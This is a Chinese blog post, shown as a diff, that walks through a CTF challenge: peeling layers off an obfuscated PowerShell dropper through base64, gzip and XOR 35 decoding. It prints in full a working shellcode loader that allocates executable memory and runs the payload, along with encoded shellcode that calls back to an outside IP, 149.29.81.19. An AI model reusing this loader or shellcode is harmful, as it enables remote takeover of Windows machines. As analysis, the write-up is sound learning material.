+<p><img src="/2021/05/06/%E4%B8%80%E9%81%93Powershell%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E7%9A%84CTF%E9%A2%98/image-20210506114427053.png" srcset="/img/loading2.gif" lazyload alt="第二次解密"></p>
+<h3 id="第二次解密">第二次解密</h3>
+<p>这时候仔细观察第一次解密后的密文，发现在密文最后有<code>IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();</code></p>
+<p>其中<code>GzipStream</code>是重点，说明密文采用了Gzip压缩。这时候只需要解压缩就可以了。</p>
+<p>执行命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> -n <span class="hljs-string">&quot;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&quot;</span> | <span class="hljs-built_in">base64</span> -d | gunzip<br></code></pre></td></tr></table></figure>
+<p>得到明文：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Set-StrictMode</span> <span class="hljs-literal">-Version</span> <span class="hljs-number">2</span><br><br><span class="hljs-variable">$DoIt</span> = <span class="hljs-string">@&#x27;</span><br><span class="hljs-string">function func_get_proc_address &#123;</span><br><span class="hljs-string">        Param ($var_module, $var_procedure)</span><br><span class="hljs-string">        $var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object &#123; $_.GlobalAssemblyCache -And $_.Location.Split(&#x27;\\&#x27;)[-1].Equals(&#x27;System.dll&#x27;) &#125;).GetType(&#x27;Microsoft.Win32.UnsafeNativeMethods&#x27;)</span><br><span class="hljs-string">        $var_gpa = $var_unsafe_native_methods.GetMethod(&#x27;GetProcAddress&#x27;, [Type[]] @(&#x27;System.Runtime.InteropServices.HandleRef&#x27;, &#x27;string&#x27;))</span><br><span class="hljs-string">        return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod(&#x27;GetModuleHandle&#x27;)).Invoke($null, @($var_module)))), $var_procedure))</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">function func_get_delegate_type &#123;</span><br><span class="hljs-string">        Param (</span><br><span class="hljs-string">                [Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,</span><br><span class="hljs-string">                [Parameter(Position = 1)] [Type] $var_return_type = [Void]</span><br><span class="hljs-string">        )</span><br><span class="hljs-string"></span><br><span class="hljs-string">        $var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName(&#x27;ReflectedDelegate&#x27;)), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule(&#x27;InMemoryModule&#x27;, $false).DefineType(&#x27;MyDelegateType&#x27;, &#x27;Class, Public, Sealed, AnsiClass, AutoClass&#x27;, [System.MulticastDelegate])</span><br><span class="hljs-string">        $var_type_builder.DefineConstructor(&#x27;RTSpecialName, HideBySig, Public&#x27;, [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags(&#x27;Runtime, Managed&#x27;)</span><br><span class="hljs-string">        $var_type_builder.DefineMethod(&#x27;Invoke&#x27;, &#x27;Public, HideBySig, NewSlot, Virtual&#x27;, $var_return_type, $var_parameters).SetImplementationFlags(&#x27;Runtime, Managed&#x27;)</span><br><span class="hljs-string"></span><br><span class="hljs-string">        return $var_type_builder.CreateType()</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">[Byte[]]$var_code = [System.Convert]::FromBase64String(&#x27;38uqIyMjQ6rGEvFHqHETqHEvqHE3qFELLJRpBRLcEuOPH0JfIQ8D4uwuIuTB03F0qHEzqGEfIvOoY1um41dpIvNzqGs7qHsDIvDAH2qoF6gi9RLcEuOP4uwuIuQbw1bXIF7bGF4HVsF7qHsHIvBFqC9oqHs/IvCoJ6gi86pnBwd4eEJ6eXLcw3t8eagxyKV+S01GVyNLVEpNSndLb1QFJNz2yyMjIyMS3HR0dHR0Sxl1WoTc9sqHIyMjeBLqcnJJIHJyS5giIyNwc0t0qrzl3PZzyq8jIyN4EvFxSyMR46dxcXFwcXNLyHYNGNz2quWg4HNLoxAjI6rDSSdzSTx1S1ZlvaXc9nwS3HR0SdxwdUsOJTtY3Pam4yyn6SIjIxLcptVXJ6rayCpLiebBftz2quJLZgJ9Etz2Etx0SSRydXNLlHTDKNz2nCMMIyMa5FYke3PKWNzc3BLcyrIiIyPK6iIjI8tM3NzcDGZ5dEUjSEwodIgEoJKXg6X5qzPHl1iO1buG+VuC6rtpnoH41qg2+GNzdpA2TdUXolH+tJ/mUO65byu/dx/NX5qstEl/1PmpWeplO0fErSN2UEZRDmJERk1XGQNuTFlKT09CDBYNEwMLQExOU0JXSkFPRhgDbnBqZgMaDRMYA3RKTUdMVFADbXcDFQ0SGAN3UUpHRk1XDBYNExgDYWxqZhoYc3dhcQouKSP4VpuFSK7RM6YYoEWg5NP6S9kDRy7v1+9l6XvafZkG84FqmRudQNMHNVeEM9WPDUrPGzBH2tZZpMkasn6vGEqpNpUUjihiQnkd4eovJ5UwNNWBtXdWBhJ7ISLKZq6AwYNoC+D0hbjBx8myxeQl7sj9hecL1KkJuU2mb+lDhPXgV+QPHbyNyxgW2LAdGXKMGjAwRDJfHspTfpmzbTfjpGaZreF0vnnOmPUrC+QoYqNMVtUlkoRz/PZlPTWZ+1fLS6OregYTdGzqEFvmcEtE2vxec7qhtWIjS9OWgXXc9kljSyMzIyNLIyNjI3RLe4dwxtz2sJojIyMjIvpycKrEdEsjAyMjcHVLMbWqwdz2puNX5agkIuCm41bGe+DLqt7c3BIXGg0RGw0bEg0SGiMjIyMg&#x27;)</span><br><span class="hljs-string"></span><br><span class="hljs-string">for ($x = 0; $x -lt $var_code.Count; $x++) &#123;</span><br><span class="hljs-string">        $var_code[$x] = $var_code[$x] -bxor 35</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">$var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))</span><br><span class="hljs-string">$var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)</span><br><span class="hljs-string">[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length)</span><br><span class="hljs-string"></span><br><span class="hljs-string">$var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([IntPtr]) ([Void])))</span><br><span class="hljs-string">$var_runme.Invoke([IntPtr]::Zero)</span><br><span class="hljs-string">&#x27;@</span><br><br><span class="hljs-keyword">If</span> ([<span class="hljs-built_in">Int</span><span class="hljs-type">Ptr</span>]::size <span class="hljs-operator">-eq</span> <span class="hljs-number">8</span>) &#123;<br>        <span class="hljs-built_in">start-job</span> &#123; <span class="hljs-keyword">param</span>(<span class="hljs-variable">$a</span>) <span class="hljs-built_in">IEX</span> <span class="hljs-variable">$a</span> &#125; <span class="hljs-literal">-RunAs32</span> <span class="hljs-literal">-Argument</span> <span class="hljs-variable">$DoIt</span> | <span class="hljs-built_in">wait-job</span> | <span class="hljs-built_in">Receive-Job</span><br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">IEX</span> <span class="hljs-variable">$DoIt</span><br>&#125;<br><br></code></pre></td></tr></table></figure>
+<p>可以看到中间又有一个base64的密文：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs base64">38uqIyMjQ6rGEvFHqHETqHEvqHE3qFELLJRpBRLcEuOPH0JfIQ8D4uwuIuTB03F0qHEzqGEfIvOoY1um41dpIvNzqGs7qHsDIvDAH2qoF6gi9RLcEuOP4uwuIuQbw1bXIF7bGF4HVsF7qHsHIvBFqC9oqHs/IvCoJ6gi86pnBwd4eEJ6eXLcw3t8eagxyKV+S01GVyNLVEpNSndLb1QFJNz2yyMjIyMS3HR0dHR0Sxl1WoTc9sqHIyMjeBLqcnJJIHJyS5giIyNwc0t0qrzl3PZzyq8jIyN4EvFxSyMR46dxcXFwcXNLyHYNGNz2quWg4HNLoxAjI6rDSSdzSTx1S1ZlvaXc9nwS3HR0SdxwdUsOJTtY3Pam4yyn6SIjIxLcptVXJ6rayCpLiebBftz2quJLZgJ9Etz2Etx0SSRydXNLlHTDKNz2nCMMIyMa5FYke3PKWNzc3BLcyrIiIyPK6iIjI8tM3NzcDGZ5dEUjSEwodIgEoJKXg6X5qzPHl1iO1buG+VuC6rtpnoH41qg2+GNzdpA2TdUXolH+tJ/mUO65byu/dx/NX5qstEl/1PmpWeplO0fErSN2UEZRDmJERk1XGQNuTFlKT09CDBYNEwMLQExOU0JXSkFPRhgDbnBqZgMaDRMYA3RKTUdMVFADbXcDFQ0SGAN3UUpHRk1XDBYNExgDYWxqZhoYc3dhcQouKSP4VpuFSK7RM6YYoEWg5NP6S9kDRy7v1+9l6XvafZkG84FqmRudQNMHNVeEM9WPDUrPGzBH2tZZpMkasn6vGEqpNpUUjihiQnkd4eovJ5UwNNWBtXdWBhJ7ISLKZq6AwYNoC+D0hbjBx8myxeQl7sj9hecL1KkJuU2mb+lDhPXgV+QPHbyNyxgW2LAdGXKMGjAwRDJfHspTfpmzbTfjpGaZreF0vnnOmPUrC+QoYqNMVtUlkoRz/PZlPTWZ+1fLS6OregYTdGzqEFvmcEtE2vxec7qhtWIjS9OWgXXc9kljSyMzIyNLIyNjI3RLe4dwxtz2sJojIyMjIvpycKrEdEsjAyMjcHVLMbWqwdz2puNX5agkIuCm41bGe+DLqt7c3BIXGg0RGw0bEg0SGiMjIyMg<br></code></pre></td></tr></table></figure>
+<h3 id="第三次解密">第三次解密</h3>
+<p>再次解密后发现又是一个乱码，说明又有什么加密处理方式我们没注意到：</p>
+<p><img src="/2021/05/06/%E4%B8%80%E9%81%93Powershell%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E7%9A%84CTF%E9%A2%98/image-20210506114917030.png" srcset="/img/loading2.gif" lazyload alt="三次解密"></p>
+<p>看明文可知，在下面的代码里进行了按位异或运算：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-keyword">for</span> (<span class="hljs-variable">$x</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$x</span> <span class="hljs-operator">-lt</span> <span class="hljs-variable">$var_code</span>.Count; <span class="hljs-variable">$x</span>++) &#123;<br>        <span class="hljs-variable">$var_code</span>[<span class="hljs-variable">$x</span>] = <span class="hljs-variable">$var_code</span>[<span class="hljs-variable">$x</span>] <span class="hljs-operator">-bxor</span> <span class="hljs-number">35</span><br>&#125;<br></code></pre></td></tr></table></figure>
+<p>打开powershell，原封不动的从明文拷贝以下指令：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\Users\Key&gt; [<span class="hljs-built_in">Byte</span>[]]<span class="hljs-variable">$var_code</span> = [<span class="hljs-type">System.Convert</span>]::FromBase64String(<span class="hljs-string">&#x27;38uqIyMjQ6rGEvFHqHETqHEvqHE3qFELLJRpBRLcEuOPH0JfIQ8D4uwuIuTB03F0qHEzqGEfIvOoY1um41dpIvNzqGs7qHsDIvDAH2qoF6gi9RLcEuOP4uwuIuQbw1bXIF7bGF4HVsF7qHsHIvBFqC9oqHs/IvCoJ6gi86pnBwd4eEJ6eXLcw3t8eagxyKV+S01GVyNLVEpNSndLb1QFJNz2yyMjIyMS3HR0dHR0Sxl1WoTc9sqHIyMjeBLqcnJJIHJyS5giIyNwc0t0qrzl3PZzyq8jIyN4EvFxSyMR46dxcXFwcXNLyHYNGNz2quWg4HNLoxAjI6rDSSdzSTx1S1ZlvaXc9nwS3HR0SdxwdUsOJTtY3Pam4yyn6SIjIxLcptVXJ6rayCpLiebBftz2quJLZgJ9Etz2Etx0SSRydXNLlHTDKNz2nCMMIyMa5FYke3PKWNzc3BLcyrIiIyPK6iIjI8tM3NzcDGZ5dEUjSEwodIgEoJKXg6X5qzPHl1iO1buG+VuC6rtpnoH41qg2+GNzdpA2TdUXolH+tJ/mUO65byu/dx/NX5qstEl/1PmpWeplO0fErSN2UEZRDmJERk1XGQNuTFlKT09CDBYNEwMLQExOU0JXSkFPRhgDbnBqZgMaDRMYA3RKTUdMVFADbXcDFQ0SGAN3UUpHRk1XDBYNExgDYWxqZhoYc3dhcQouKSP4VpuFSK7RM6YYoEWg5NP6S9kDRy7v1+9l6XvafZkG84FqmRudQNMHNVeEM9WPDUrPGzBH2tZZpMkasn6vGEqpNpUUjihiQnkd4eovJ5UwNNWBtXdWBhJ7ISLKZq6AwYNoC+D0hbjBx8myxeQl7sj9hecL1KkJuU2mb+lDhPXgV+QPHbyNyxgW2LAdGXKMGjAwRDJfHspTfpmzbTfjpGaZreF0vnnOmPUrC+QoYqNMVtUlkoRz/PZlPTWZ+1fLS6OregYTdGzqEFvmcEtE2vxec7qhtWIjS9OWgXXc9kljSyMzIyNLIyNjI3RLe4dwxtz2sJojIyMjIvpycKrEdEsjAyMjcHVLMbWqwdz2puNX5agkIuCm41bGe+DLqt7c3BIXGg0RGw0bEg0SGiMjIyMg&#x27;</span>)<br><span class="hljs-built_in">PS</span> C:\Users\Key&gt; <span class="hljs-keyword">for</span> (<span class="hljs-variable">$x</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$x</span> <span class="hljs-operator">-lt</span> <span class="hljs-variable">$var_code</span>.Count; <span class="hljs-variable">$x</span>++) &#123;<br>&gt;&gt;         <span class="hljs-variable">$var_code</span>[<span class="hljs-variable">$x</span>] = <span class="hljs-variable">$var_code</span>[<span class="hljs-variable">$x</span>] <span class="hljs-operator">-bxor</span> <span class="hljs-number">35</span><br>&gt;&gt; &#125;<br><span class="hljs-built_in">PS</span> C:\Users\Key&gt;<br></code></pre></td></tr></table></figure>
+<p>此时，再对异或运算之后<code>$var_code</code>这一变量进行base64逆运算，此时会报错：</p>
+<p><img src="/2021/05/06/%E4%B8%80%E9%81%93Powershell%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E7%9A%84CTF%E9%A2%98/image-20210506152241767.png" srcset="/img/loading2.gif" lazyload alt="报错"></p>
+<p>不过无所谓，把出错的base64值，也就是下面的值用linux里的base64再次解密即可：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs base64">/OiJAAAAYInlMdJki1Iwi1IMi1IUi3IoD7dKJjH/McCsPGF8Aiwgwc8NAcfi8FJXi1IQi0I8AdCLQHiFwHRKAdBQi0gYi1ggAdPjPEmLNIsB1<br>jH/McCswc8NAcc44HX0A334O30kdeJYi1gkAdNmiwxLi1gcAdOLBIsB0IlEJCRbW2FZWlH/4FhfWosS64ZdaG5ldABod2luaVRoTHcmB//V6AAAAAAx/1dX<br>V1dXaDpWeaf/1emkAAAAWzHJUVFqA1FRaLsBAABTUGhXiZ/G/9VQ6YwAAABbMdJSaAAywIRSUlJTUlBo61UuO//VicaDw1BogDMAAIngagRQah9WaHVGnob<br>/1V8x/1dXav9TVmgtBhh7/9WFwA+EygEAADH/hfZ0BIn56wloqsXiXf/VicFoRSFeMf/VMf9XagdRVlBot1fgC//VvwAvAAA5x3UHWFDpe////zH/6ZEBAA<br>DpyQEAAOhv////L0VaV2YAa28LV6sng7G0oIbaiBDktHut9pil2nihyZhKvaLb9YsV20BQVbMVbvY0gXLdl7zFc82aTAicVDzufLmPl2pc99qKeslGGGTnj<br>gBVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTVNJRSA5LjA7IFdpbmRvd3MgTlQgNi4xOyBUcmlkZW50LzUuMDsgQk9JRTk7UFRCUikN<br>CgDbdbima43yEIU7g2aDx/DZaPogZA3M9MxGylj5Xrol0KJJuji+Y/AkFnSnEPasLmnsOBNk+fV6h+o5kV2MO2mKFbY3rQtBYVo+wskMBLYTF/aillR1JTF<br>YAgHpRY2j4qBLKMPXppvi5OqR5scGzevepsQo94oqmm6FTMpgp9bDdMcsPp+u6Ds1+5M+OlGvORMTZxF8PelwXbqQThTAh0W6jsJXnVrtu9YIKMcLQYBvdf<br>YGsadQ39VGHha62HToaICIWSUwV0/JM3jFU2hn+d99UJmClkEAaPC1olb/1WpAaAAQAABoAABAAFdoWKRT5f/Vk7kAAAAAAdlRU4nnV2gAIAAAU1ZoEpaJ4<br>v/VhcB0xosHAcOFwHXlWMPoif3//zE0OS4yOC44MS4xOQAAAAAD<br></code></pre></td></tr></table></figure>
+<p>结果图如下，可知道IP地址为149.29.81.19。</p>
+<p><img src="/2021/05/06/%E4%B8%80%E9%81%93Powershell%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E7%9A%84CTF%E9%A2%98/image-20210506152421262.png" srcset="/img/loading2.gif" lazyload alt="最终解密结果"></p>
+<div class="note note-info">
+            <p>参考：<a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=RX2o7GTVG6Q">https://www.youtube.com/watch?v=RX2o7GTVG6Q</a></p><p>这个是苑老师的解法，需要密钥，但是不清楚密钥从原文哪里可以看出。另外也不知道端口号怎么解出。</p><p>猜测是进行端口扫描可以知道，答案是149.29.81.19:443。</p>
+          </div>
+<h2 id="0x03-参考">0x03 参考</h2>
+<p><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=RX2o7GTVG6Q">https://www.youtube.com/watch?v=RX2o7GTVG6Q</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45503700/article/details/100678500">https://blog.csdn.net/qq_45503700/article/details/100678500</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/aleenzz/Cobalt_Strike_wiki/blob/master/2.%E7%AC%AC%E5%85%AD%E8%8A%82%5Bpowershell%E6%B7%B7%E6%B7%86%5D.md">https://github.com/aleenzz/Cobalt_Strike_wiki/blob/master/2.第六节[powershell混淆].md</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.thinbug.com/q/48620882">https://www.thinbug.com/q/48620882</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45503700/article/details/100678500">https://blog.csdn.net/qq_45503700/article/details/100678500</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E5%AD%A6%E4%B9%A0/" class="category-chain-item">学习</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/%E5%AD%A6%E4%B9%A0/CTF/" class="category-chain-item">CTF</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E5%AD%A6%E4%B9%A0/">#学习</a>
+      
+        <a href="/tags/CTF/">#CTF</a>
+      
+        <a href="/tags/Powershell/">#Powershell</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>一道Powershell代码混淆的CTF题</div>
+      <div>https://k1nm0.com/2021/05/06/一道Powershell代码混淆的CTF题/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>K1nm0</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2021年5月6日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/05/31/%E6%B5%85%E8%B0%88%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB/" title="浅谈拒绝服务攻击">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">浅谈拒绝服务攻击</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/05/05/%E5%8D%9A%E5%AE%A2%E6%96%B0%E4%B8%BB%E9%A2%98%E7%9A%84%E6%8A%98%E8%85%BE%E8%BF%87%E7%A8%8B/" title="博客新主题的折腾过程">
+                        <span class="hidden-mobile">博客新主题的折腾过程</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <span>K1nm0 © 2019 – 2022 </span> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
